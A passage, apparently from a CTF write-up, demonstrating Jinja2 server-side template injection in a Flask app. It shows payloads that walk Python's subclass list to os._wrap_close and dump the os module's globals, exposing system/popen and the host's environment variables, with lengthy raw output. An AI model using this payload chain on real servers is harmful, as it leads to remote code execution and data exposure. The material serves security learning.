        <class 'sqlalchemy.orm.unitofwork.UOWTransaction'>
        <class 'sqlalchemy.orm.unitofwork.IterateMappersMixin'>
        <class 'sqlalchemy.orm.unitofwork.PostSortRec'>
        <class 'sqlalchemy.orm.session._SessionClassMethods'>
        <class 'sqlalchemy.orm.scoping.ScopedSessionMixin'>
        <class 'sqlalchemy.orm.events._InstrumentationEventsHold'>
        <class 'sqlalchemy.orm.events._EventsHold.HoldEvents'>
        <class 'sqlalchemy.orm.strategies.LoadDeferredColumns'>
        <class 'sqlalchemy.orm.strategies.LoadLazyAttribute'>
        <class 'sqlalchemy.orm.strategies.SubqueryLoader._SubqCollections'>
        <class 'sqlalchemy.orm.dynamic.DynamicCollectionAdapter'>
        <class 'sqlalchemy.orm.dynamic.AppenderMixin'>
        <class 'sqlalchemy.orm.dynamic.CollectionHistory'>
        <class 'sqlalchemy.orm.dependency.DependencyProcessor'>
        <class 'flask_sqlalchemy.pagination.Pagination'>
        <class 'flask_sqlalchemy.model._QueryProperty'>
        <class 'flask_sqlalchemy.model.Model'>
        <class 'flask_sqlalchemy.extension.SQLAlchemy'>
        <class 'sqlalchemy.dialects.sqlite.json._FormatTypeMixin'>
        <class 'sqlalchemy.dialects.sqlite.base._DateTimeMixin'>
        <class 'sqlalchemy.dialects.sqlite.aiosqlite.AsyncAdapt_aiosqlite_cursor'>
        <class 'sqlalchemy.dialects.sqlite.aiosqlite.AsyncAdapt_aiosqlite_dbapi'>
        <class 'sqlite3.Row'>
        <class 'sqlite3.Cursor'>
        <class 'sqlite3.Connection'>
        <class 'sqlite3.Statement'>
        <class 'sqlite3.PrepareProtocol'>
        <class 'sqlite3.Blob'>]
        ```
        :::
        And we need to find `<class 'os._wrap_close'>` which is in line 141 that is in 140-th of list.
    * Payload: `{{[].__class__.__base__.__subclasses__()[140].__init__}}` → Output: `<function _wrap_close.__init__ at 0x7fceecae2a20>`
    * Payload: `{{[].__class__.__base__.__subclasses__()[140].__init__.__globals__}}` → 
        :::spoiler Output: 
        ```=
        Hello {'__name__': 'os', '__doc__': "OS routines for NT or Posix depending on what system we're on.\n\nThis exports:\n  - all functions from posix or nt, e.g. unlink, stat, etc.\n  - os.path is either posixpath or ntpath\n  - os.name is either 'posix' or 'nt'\n  - os.curdir is a string representing the current directory (always '.')\n  - os.pardir is a string representing the parent directory (always '..')\n  - os.sep is the (or a most common) pathname separator ('/' or '\\\\')\n  - os.extsep is the extension separator (always '.')\n  - os.altsep is the alternate pathname separator (None or '/')\n  - os.pathsep is the component separator used in $PATH etc\n  - os.linesep is the line separator in text files ('\\r' or '\\n' or '\\r\\n')\n  - os.defpath is the default search path for executables\n  - os.devnull is the file path of the null device ('/dev/null', etc.)\n\nPrograms that import and use 'os' stand a better chance of being\nportable between different platforms.  Of course, they must then\nonly use functions that are defined by all platforms (e.g., unlink\nand opendir), and leave all pathname manipulation to os.path\n(e.g., split and join).\n", '__package__': '', '__loader__': <class '_frozen_importlib.FrozenImporter'>, '__spec__': ModuleSpec(name='os', loader=<class '_frozen_importlib.FrozenImporter'>, origin='frozen'), '__file__': '/usr/local/lib/python3.11/os.py', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'aiter': <built-in function aiter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'anext': <built-in function anext>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'BaseExceptionGroup': <class 'BaseExceptionGroup'>, 'Exception': <class 'Exception'>, 'GeneratorExit': <class 'GeneratorExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'SystemExit': <class 'SystemExit'>, 'ArithmeticError': <class 'ArithmeticError'>, 'AssertionError': <class 'AssertionError'>, 'AttributeError': <class 'AttributeError'>, 'BufferError': <class 'BufferError'>, 'EOFError': <class 'EOFError'>, 'ImportError': <class 'ImportError'>, 'LookupError': <class 'LookupError'>, 'MemoryError': <class 'MemoryError'>, 'NameError': <class 'NameError'>, 'OSError': <class 'OSError'>, 'ReferenceError': <class 'ReferenceError'>, 'RuntimeError': <class 'RuntimeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'SyntaxError': <class 'SyntaxError'>, 'SystemError': <class 'SystemError'>, 'TypeError': <class 'TypeError'>, 'ValueError': <class 'ValueError'>, 'Warning': <class 'Warning'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'BytesWarning': <class 'BytesWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'EncodingWarning': <class 'EncodingWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'UserWarning': <class 'UserWarning'>, 'BlockingIOError': <class 'BlockingIOError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionError': <class 'ConnectionError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'InterruptedError': <class 'InterruptedError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'IndentationError': <class 'IndentationError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'RecursionError': <class 'RecursionError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'UnicodeError': <class 'UnicodeError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'TabError': <class 'TabError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'ExceptionGroup': <class 'ExceptionGroup'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2022 Python Software Foundation.
        All Rights Reserved.

        Copyright (c) 2000 BeOpen.com.
        All Rights Reserved.

        Copyright (c) 1995-2001 Corporation for National Research Initiatives.
        All Rights Reserved.

        Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
        All Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
            for supporting Python development.  See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'abc': <module 'abc' (frozen)>, 'sys': <module 'sys' (built-in)>, 'st': <module 'stat' (frozen)>, '_check_methods': <function _check_methods at 0x7fceecd1f100>, 'GenericAlias': <class 'types.GenericAlias'>, '__all__': ['altsep', 'curdir', 'pardir', 'sep', 'pathsep', 'linesep', 'defpath', 'name', 'path', 'devnull', 'SEEK_SET', 'SEEK_CUR', 'SEEK_END', 'fsencode', 'fsdecode', 'get_exec_path', 'fdopen', 'extsep', '_exit', 'CLD_CONTINUED', 'CLD_DUMPED', 'CLD_EXITED', 'CLD_KILLED', 'CLD_STOPPED', 'CLD_TRAPPED', 'DirEntry', 'EFD_CLOEXEC', 'EFD_NONBLOCK', 'EFD_SEMAPHORE', 'EX_CANTCREAT', 'EX_CONFIG', 'EX_DATAERR', 'EX_IOERR', 'EX_NOHOST', 'EX_NOINPUT', 'EX_NOPERM', 'EX_NOUSER', 'EX_OK', 'EX_OSERR', 'EX_OSFILE', 'EX_PROTOCOL', 'EX_SOFTWARE', 'EX_TEMPFAIL', 'EX_UNAVAILABLE', 'EX_USAGE', 'F_LOCK', 'F_OK', 'F_TEST', 'F_TLOCK', 'F_ULOCK', 'GRND_NONBLOCK', 'GRND_RANDOM', 'MFD_ALLOW_SEALING', 'MFD_CLOEXEC', 'MFD_HUGETLB', 'MFD_HUGE_16GB', 'MFD_HUGE_16MB', 'MFD_HUGE_1GB', 'MFD_HUGE_1MB', 'MFD_HUGE_256MB', 'MFD_HUGE_2GB', 'MFD_HUGE_2MB', 'MFD_HUGE_32MB', 'MFD_HUGE_512KB', 'MFD_HUGE_512MB', 'MFD_HUGE_64KB', 'MFD_HUGE_8MB', 'MFD_HUGE_MASK', 'MFD_HUGE_SHIFT', 'NGROUPS_MAX', 'O_ACCMODE', 'O_APPEND', 'O_ASYNC', 'O_CLOEXEC', 'O_CREAT', 'O_DIRECT', 'O_DIRECTORY', 'O_DSYNC', 'O_EXCL', 'O_FSYNC', 'O_LARGEFILE', 'O_NDELAY', 'O_NOATIME', 'O_NOCTTY', 'O_NOFOLLOW', 'O_NONBLOCK', 'O_PATH', 'O_RDONLY', 'O_RDWR', 'O_RSYNC', 'O_SYNC', 'O_TMPFILE', 'O_TRUNC', 'O_WRONLY', 'POSIX_FADV_DONTNEED', 'POSIX_FADV_NOREUSE', 'POSIX_FADV_NORMAL', 'POSIX_FADV_RANDOM', 'POSIX_FADV_SEQUENTIAL', 'POSIX_FADV_WILLNEED', 'POSIX_SPAWN_CLOSE', 'POSIX_SPAWN_DUP2', 'POSIX_SPAWN_OPEN', 'PRIO_PGRP', 'PRIO_PROCESS', 'PRIO_USER', 'P_ALL', 'P_PGID', 'P_PID', 'P_PIDFD', 'RTLD_DEEPBIND', 'RTLD_GLOBAL', 'RTLD_LAZY', 'RTLD_LOCAL', 'RTLD_NODELETE', 'RTLD_NOLOAD', 'RTLD_NOW', 'RWF_APPEND', 'RWF_DSYNC', 'RWF_HIPRI', 'RWF_NOWAIT', 'RWF_SYNC', 'R_OK', 'SCHED_BATCH', 'SCHED_FIFO', 'SCHED_IDLE', 'SCHED_OTHER', 'SCHED_RESET_ON_FORK', 'SCHED_RR', 'SEEK_DATA', 'SEEK_HOLE', 'SPLICE_F_MORE', 'SPLICE_F_MOVE', 'SPLICE_F_NONBLOCK', 'ST_APPEND', 'ST_MANDLOCK', 'ST_NOATIME', 'ST_NODEV', 'ST_NODIRATIME', 'ST_NOEXEC', 'ST_NOSUID', 'ST_RDONLY', 'ST_RELATIME', 'ST_SYNCHRONOUS', 'ST_WRITE', 'TMP_MAX', 'WCONTINUED', 'WCOREDUMP', 'WEXITED', 'WEXITSTATUS', 'WIFCONTINUED', 'WIFEXITED', 'WIFSIGNALED', 'WIFSTOPPED', 'WNOHANG', 'WNOWAIT', 'WSTOPPED', 'WSTOPSIG', 'WTERMSIG', 'WUNTRACED', 'W_OK', 'XATTR_CREATE', 'XATTR_REPLACE', 'XATTR_SIZE_MAX', 'X_OK', 'abort', 'access', 'chdir', 'chmod', 'chown', 'chroot', 'close', 'closerange', 'confstr', 'confstr_names', 'copy_file_range', 'cpu_count', 'ctermid', 'device_encoding', 'dup', 'dup2', 'environ', 'error', 'eventfd', 'eventfd_read', 'eventfd_write', 'execv', 'execve', 'fchdir', 'fchmod', 'fchown', 'fdatasync', 'fork', 'forkpty', 'fpathconf', 'fspath', 'fstat', 'fstatvfs', 'fsync', 'ftruncate', 'get_blocking', 'get_inheritable', 'get_terminal_size', 'getcwd', 'getcwdb', 'getegid', 'geteuid', 'getgid', 'getgrouplist', 'getgroups', 'getloadavg', 'getlogin', 'getpgid', 'getpgrp', 'getpid', 'getppid', 'getpriority', 'getrandom', 'getresgid', 'getresuid', 'getsid', 'getuid', 'getxattr', 'initgroups', 'isatty', 'kill', 'killpg', 'lchown', 'link', 'listdir', 'listxattr', 'lockf', 'login_tty', 'lseek', 'lstat', 'major', 'makedev', 'memfd_create', 'minor', 'mkdir', 'mkfifo', 'mknod', 'nice', 'open', 'openpty', 'pathconf', 'pathconf_names', 'pidfd_open', 'pipe', 'pipe2', 'posix_fadvise', 'posix_fallocate', 'posix_spawn', 'posix_spawnp', 'pread', 'preadv', 'putenv', 'pwrite', 'pwritev', 'read', 'readlink', 'readv', 'register_at_fork', 'remove', 'removexattr', 'rename', 'replace', 'rmdir', 'scandir', 'sched_get_priority_max', 'sched_get_priority_min', 'sched_getaffinity', 'sched_getparam', 'sched_getscheduler', 'sched_param', 'sched_rr_get_interval', 'sched_setaffinity', 'sched_setparam', 'sched_setscheduler', 'sched_yield', 'sendfile', 'set_blocking', 'set_inheritable', 'setegid', 'seteuid', 'setgid', 'setgroups', 'setpgid', 'setpgrp', 'setpriority', 'setregid', 'setresgid', 'setresuid', 'setreuid', 'setsid', 'setuid', 'setxattr', 'splice', 'stat', 'stat_result', 'statvfs', 'statvfs_result', 'strerror', 'symlink', 'sync', 'sysconf', 'sysconf_names', 'system', 'tcgetpgrp', 'tcsetpgrp', 'terminal_size', 'times', 'times_result', 'truncate', 'ttyname', 'umask', 'uname', 'uname_result', 'unlink', 'unsetenv', 'urandom', 'utime', 'wait', 'wait3', 'wait4', 'waitid', 'waitid_result', 'waitpid', 'waitstatus_to_exitcode', 'write', 'writev', 'makedirs', 'removedirs', 'renames', 'walk', 'fwalk', 'execl', 'execle', 'execlp', 'execlpe', 'execvp', 'execvpe', 'getenv', 'supports_bytes_environ', 'environb', 'getenvb', 'P_WAIT', 'P_NOWAIT', 'P_NOWAITO', 'spawnv', 'spawnve', 'spawnvp', 'spawnvpe', 'spawnl', 'spawnle', 'spawnlp', 'spawnlpe', 'popen'], '_exists': <function _exists at 0x7fceecd1dd00>, '_get_exports_list': <function _get_exports_list at 0x7fceecd1de40>, 'name': 'posix', 'linesep': '\n', 'stat': <built-in function stat>, 'access': <built-in function access>, 'ttyname': <built-in function ttyname>, 'chdir': <built-in function chdir>, 'chmod': <built-in function chmod>, 'fchmod': <built-in function fchmod>, 'chown': <built-in function chown>, 'fchown': <built-in function fchown>, 'lchown': <built-in function lchown>, 'chroot': <built-in function chroot>, 'ctermid': <built-in function ctermid>, 'getcwd': <built-in function getcwd>, 'getcwdb': <built-in function getcwdb>, 'link': <built-in function link>, 'listdir': <built-in function listdir>, 'lstat': <built-in function lstat>, 'mkdir': <built-in function mkdir>, 'nice': <built-in function nice>, 'getpriority': <built-in function getpriority>, 'setpriority': <built-in function setpriority>, 'posix_spawn': <built-in function posix_spawn>, 'posix_spawnp': <built-in function posix_spawnp>, 'readlink': <built-in function readlink>, 'copy_file_range': <built-in function copy_file_range>, 'splice': <built-in function splice>, 'rename': <built-in function rename>, 'replace': <built-in function replace>, 'rmdir': <built-in function rmdir>, 'symlink': <built-in function symlink>, 'system': <built-in function system>, 'umask': <built-in function umask>, 'uname': <built-in function uname>, 'unlink': <built-in function unlink>, 'remove': <built-in function remove>, 'utime': <built-in function utime>, 'times': <built-in function times>, 'execv': <built-in function execv>, 'execve': <built-in function execve>, 'fork': <built-in function fork>, 'register_at_fork': <built-in function register_at_fork>, 'sched_get_priority_max': <built-in function sched_get_priority_max>, 'sched_get_priority_min': <built-in function sched_get_priority_min>, 'sched_getparam': <built-in function sched_getparam>, 'sched_getscheduler': <built-in function sched_getscheduler>, 'sched_rr_get_interval': <built-in function sched_rr_get_interval>, 'sched_setparam': <built-in function sched_setparam>, 'sched_setscheduler': <built-in function sched_setscheduler>, 'sched_yield': <built-in function sched_yield>, 'sched_setaffinity': <built-in function sched_setaffinity>, 'sched_getaffinity': <built-in function sched_getaffinity>, 'openpty': <built-in function openpty>, 'login_tty': <built-in function login_tty>, 'forkpty': <built-in function forkpty>, 'getegid': <built-in function getegid>, 'geteuid': <built-in function geteuid>, 'getgid': <built-in function getgid>, 'getgrouplist': <built-in function getgrouplist>, 'getgroups': <built-in function getgroups>, 'getpid': <built-in function getpid>, 'getpgrp': <built-in function getpgrp>, 'getppid': <built-in function getppid>, 'getuid': <built-in function getuid>, 'getlogin': <built-in function getlogin>, 'kill': <built-in function kill>, 'killpg': <built-in function killpg>, 'setuid': <built-in function setuid>, 'seteuid': <built-in function seteuid>, 'setreuid': <built-in function setreuid>, 'setgid': <built-in function setgid>, 'setegid': <built-in function setegid>, 'setregid': <built-in function setregid>, 'setgroups': <built-in function setgroups>, 'initgroups': <built-in function initgroups>, 'getpgid': <built-in function getpgid>, 'setpgrp': <built-in function setpgrp>, 'wait': <built-in function wait>, 'wait3': <built-in function wait3>, 'wait4': <built-in function wait4>, 'waitid': <built-in function waitid>, 'waitpid': <built-in function waitpid>, 'pidfd_open': <built-in function pidfd_open>, 'getsid': <built-in function getsid>, 'setsid': <built-in function setsid>, 'setpgid': <built-in function setpgid>, 'tcgetpgrp': <built-in function tcgetpgrp>, 'tcsetpgrp': <built-in function tcsetpgrp>, 'open': <built-in function open>, 'close': <built-in function close>, 'closerange': <built-in function closerange>, 'device_encoding': <built-in function device_encoding>, 'dup': <built-in function dup>, 'dup2': <built-in function dup2>, 'lockf': <built-in function lockf>, 'lseek': <built-in function lseek>, 'read': <built-in function read>, 'readv': <built-in function readv>, 'pread': <built-in function pread>, 'preadv': <built-in function preadv>, 'write': <built-in function write>, 'writev': <built-in function writev>, 'pwrite': <built-in function pwrite>, 'pwritev': <built-in function pwritev>, 'sendfile': <built-in function sendfile>, 'fstat': <built-in function fstat>, 'isatty': <built-in function isatty>, 'pipe': <built-in function pipe>, 'pipe2': <built-in function pipe2>, 'mkfifo': <built-in function mkfifo>, 'mknod': <built-in function mknod>, 'major': <built-in function major>, 'minor': <built-in function minor>, 'makedev': <built-in function makedev>, 'ftruncate': <built-in function ftruncate>, 'truncate': <built-in function truncate>, 'posix_fallocate': <built-in function posix_fallocate>, 'posix_fadvise': <built-in function posix_fadvise>, 'putenv': <built-in function putenv>, 'unsetenv': <built-in function unsetenv>, 'strerror': <built-in function strerror>, 'fchdir': <built-in function fchdir>, 'fsync': <built-in function fsync>, 'sync': <built-in function sync>, 'fdatasync': <built-in function fdatasync>, 'WCOREDUMP': <built-in function WCOREDUMP>, 'WIFCONTINUED': <built-in function WIFCONTINUED>, 'WIFSTOPPED': <built-in function WIFSTOPPED>, 'WIFSIGNALED': <built-in function WIFSIGNALED>, 'WIFEXITED': <built-in function WIFEXITED>, 'WEXITSTATUS': <built-in function WEXITSTATUS>, 'WTERMSIG': <built-in function WTERMSIG>, 'WSTOPSIG': <built-in function WSTOPSIG>, 'fstatvfs': <built-in function fstatvfs>, 'statvfs': <built-in function statvfs>, 'confstr': <built-in function confstr>, 'sysconf': <built-in function sysconf>, 'fpathconf': <built-in function fpathconf>, 'pathconf': <built-in function pathconf>, 'abort': <built-in function abort>, 'getloadavg': <built-in function getloadavg>, 'urandom': <built-in function urandom>, 'setresuid': <built-in function setresuid>, 'setresgid': <built-in function setresgid>, 'getresuid': <built-in function getresuid>, 'getresgid': <built-in function getresgid>, 'getxattr': <built-in function getxattr>, 'setxattr': <built-in function setxattr>, 'removexattr': <built-in function removexattr>, 'listxattr': <built-in function listxattr>, 'get_terminal_size': <built-in function get_terminal_size>, 'cpu_count': <built-in function cpu_count>, 'get_inheritable': <built-in function get_inheritable>, 'set_inheritable': <built-in function set_inheritable>, 'get_blocking': <built-in function get_blocking>, 'set_blocking': <built-in function set_blocking>, 'scandir': <built-in function scandir>, 'fspath': <built-in function fspath>, 'getrandom': <built-in function getrandom>, 'memfd_create': <built-in function memfd_create>, 'eventfd': <built-in function eventfd>, 'eventfd_read': <built-in function eventfd_read>, 'eventfd_write': <built-in function eventfd_write>, 'waitstatus_to_exitcode': <built-in function waitstatus_to_exitcode>, 'environ': environ({'HOSTNAME': '2a88d9e3b6e8', 'PYTHON_PIP_VERSION': '22.3', 'HOME': '/root', 'GPG_KEY': 'A035C8C19219BA821ECEA86B64E628F8D684696D', 'PYTHON_GET_PIP_URL': 'https://github.com/pypa/get-pip/raw/66030fa03382b4914d4c4d0896961a0bdeeeb274/public/get-pip.py', 'PATH': '/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'LANG': 'C.UTF-8', 'PYTHON_VERSION': '3.11.0', 'PYTHON_SETUPTOOLS_VERSION': '65.5.0', 'PWD': '/code', 'PYTHON_GET_PIP_SHA256': '1e501cf004eac1b7eb1f97266d28f995ae835d30250bec7f8850562703067dc6', 'WERKZEUG_SERVER_FD': '3'}), 'F_OK': 0, 'R_OK': 4, 'W_OK': 2, 'X_OK': 1, 'NGROUPS_MAX': 65536, 'TMP_MAX': 238328, 'WCONTINUED': 8, 'WNOHANG': 1, 'WUNTRACED': 2, 'O_RDONLY': 0, 'O_WRONLY': 1, 'O_RDWR': 2, 'O_NDELAY': 2048, 'O_NONBLOCK': 2048, 'O_APPEND': 1024, 'O_DSYNC': 4096, 'O_RSYNC': 1052672, 'O_SYNC': 1052672, 'O_NOCTTY': 256, 'O_CREAT': 64, 'O_EXCL': 128, 'O_TRUNC': 512, 'O_LARGEFILE': 0, 'O_PATH': 2097152, 'O_TMPFILE': 4259840, 'PRIO_PROCESS': 0, 'PRIO_PGRP': 1, 'PRIO_USER': 2, 'O_CLOEXEC': 524288, 'O_ACCMODE': 3, 'O_FSYNC': 1052672, 'SEEK_HOLE': 4, 'SEEK_DATA': 3, 'O_ASYNC': 8192, 'O_DIRECT': 16384, 'O_DIRECTORY': 65536, 'O_NOFOLLOW': 131072, 'O_NOATIME': 262144, 'EX_OK': 0, 'EX_USAGE': 64, 'EX_DATAERR': 65, 'EX_NOINPUT': 66, 'EX_NOUSER': 67, 'EX_NOHOST': 68, 'EX_UNAVAILABLE': 69, 'EX_SOFTWARE': 70, 'EX_OSERR': 71, 'EX_OSFILE': 72, 'EX_CANTCREAT': 73, 'EX_IOERR': 74, 'EX_TEMPFAIL': 75, 'EX_PROTOCOL': 76, 'EX_NOPERM': 77, 'EX_CONFIG': 78, 'ST_RDONLY': 1, 'ST_NOSUID': 2, 'ST_NODEV': 4, 'ST_NOEXEC': 8, 'ST_SYNCHRONOUS': 16, 'ST_MANDLOCK': 64, 'ST_WRITE': 128, 'ST_APPEND': 256, 'ST_NOATIME': 1024, 'ST_NODIRATIME': 2048, 'ST_RELATIME': 4096, 'POSIX_FADV_NORMAL': 0, 'POSIX_FADV_SEQUENTIAL': 2, 'POSIX_FADV_RANDOM': 1, 'POSIX_FADV_NOREUSE': 5, 'POSIX_FADV_WILLNEED': 3, 'POSIX_FADV_DONTNEED': 4, 'P_PID': 1, 'P_PGID': 2, 'P_ALL': 0, 'P_PIDFD': 3, 'WEXITED': 4, 'WNOWAIT': 16777216, 'WSTOPPED': 2, 'CLD_EXITED': 1, 'CLD_KILLED': 2, 'CLD_DUMPED': 3, 'CLD_TRAPPED': 4, 'CLD_STOPPED': 5, 'CLD_CONTINUED': 6, 'F_LOCK': 1, 'F_TLOCK': 2, 'F_ULOCK': 0, 'F_TEST': 3, 'RWF_DSYNC': 2, 'RWF_HIPRI': 1, 'RWF_SYNC': 4, 'RWF_NOWAIT': 8, 'RWF_APPEND': 16, 'SPLICE_F_MOVE': 1, 'SPLICE_F_NONBLOCK': 2, 'SPLICE_F_MORE': 4, 'POSIX_SPAWN_OPEN': 0, 'POSIX_SPAWN_CLOSE': 1, 'POSIX_SPAWN_DUP2': 2, 'SCHED_OTHER': 0, 'SCHED_FIFO': 1, 'SCHED_RR': 2, 'SCHED_BATCH': 3, 'SCHED_IDLE': 5, 'SCHED_RESET_ON_FORK': 1073741824, 'XATTR_CREATE': 1, 'XATTR_REPLACE': 2, 'XATTR_SIZE_MAX': 65536, 'RTLD_LAZY': 1, 'RTLD_NOW': 2, 'RTLD_GLOBAL': 256, 'RTLD_LOCAL': 0, 'RTLD_NODELETE': 4096, 'RTLD_NOLOAD': 4, 'RTLD_DEEPBIND': 8, 'GRND_RANDOM': 2, 'GRND_NONBLOCK': 1, 'MFD_CLOEXEC': 1, 'MFD_ALLOW_SEALING': 2, 'MFD_HUGETLB': 4, 'MFD_HUGE_SHIFT': 26, 'MFD_HUGE_MASK': 63, 'MFD_HUGE_64KB': 1073741824, 'MFD_HUGE_512KB': 1275068416, 'MFD_HUGE_1MB': 1342177280, 'MFD_HUGE_2MB': 1409286144, 'MFD_HUGE_8MB': 1543503872, 'MFD_HUGE_16MB': 1610612736, 'MFD_HUGE_32MB': 1677721600, 'MFD_HUGE_256MB': 1879048192, 'MFD_HUGE_512MB': 1946157056, 'MFD_HUGE_1GB': 2013265920, 'MFD_HUGE_2GB': 2080374784, 'MFD_HUGE_16GB': -2013265920, 'EFD_CLOEXEC': 524288, 'EFD_NONBLOCK': 2048, 'EFD_SEMAPHORE': 1, 'pathconf_names': {'PC_ALLOC_SIZE_MIN': 18, 'PC_ASYNC_IO': 10, 'PC_CHOWN_RESTRICTED': 6, 'PC_FILESIZEBITS': 13, 'PC_LINK_MAX': 0, 'PC_MAX_CANON': 1, 'PC_MAX_INPUT': 2, 'PC_NAME_MAX': 3, 'PC_NO_TRUNC': 7, 'PC_PATH_MAX': 4, 'PC_PIPE_BUF': 5, 'PC_PRIO_IO': 11, 'PC_REC_INCR_XFER_SIZE': 14, 'PC_REC_MAX_XFER_SIZE': 15, 'PC_REC_MIN_XFER_SIZE': 16, 'PC_REC_XFER_ALIGN': 17, 'PC_SOCK_MAXBUF': 12, 'PC_SYMLINK_MAX': 19, 'PC_SYNC_IO': 9, 'PC_VDISABLE': 8}, 'confstr_names': {'CS_GNU_LIBC_VERSION': 2, 'CS_GNU_LIBPTHREAD_VERSION': 3, 'CS_LFS64_CFLAGS': 1004, 'CS_LFS64_LDFLAGS': 1005, 'CS_LFS64_LIBS': 1006, 'CS_LFS64_LINTFLAGS': 1007, 'CS_LFS_CFLAGS': 1000, 'CS_LFS_LDFLAGS': 1001, 'CS_LFS_LIBS': 1002, 'CS_LFS_LINTFLAGS': 1003, 'CS_PATH': 0, 'CS_XBS5_ILP32_OFF32_CFLAGS': 1100, 'CS_XBS5_ILP32_OFF32_LDFLAGS': 1101, 'CS_XBS5_ILP32_OFF32_LIBS': 1102, 'CS_XBS5_ILP32_OFF32_LINTFLAGS': 1103, 'CS_XBS5_ILP32_OFFBIG_CFLAGS': 1104, 'CS_XBS5_ILP32_OFFBIG_LDFLAGS': 1105, 'CS_XBS5_ILP32_OFFBIG_LIBS': 1106, 'CS_XBS5_ILP32_OFFBIG_LINTFLAGS': 1107, 'CS_XBS5_LP64_OFF64_CFLAGS': 1108, 'CS_XBS5_LP64_OFF64_LDFLAGS': 1109, 'CS_XBS5_LP64_OFF64_LIBS': 1110, 'CS_XBS5_LP64_OFF64_LINTFLAGS': 1111, 'CS_XBS5_LPBIG_OFFBIG_CFLAGS': 1112, 'CS_XBS5_LPBIG_OFFBIG_LDFLAGS': 1113, 'CS_XBS5_LPBIG_OFFBIG_LIBS': 1114, 'CS_XBS5_LPBIG_OFFBIG_LINTFLAGS': 1115}, 'sysconf_names': {'SC_2_CHAR_TERM': 95, 'SC_2_C_BIND': 47, 'SC_2_C_DEV': 48, 'SC_2_C_VERSION': 96, 'SC_2_FORT_DEV': 49, 'SC_2_FORT_RUN': 50, 'SC_2_LOCALEDEF': 52, 'SC_2_SW_DEV': 51, 'SC_2_UPE': 97, 'SC_2_VERSION': 46, 'SC_AIO_LISTIO_MAX': 23, 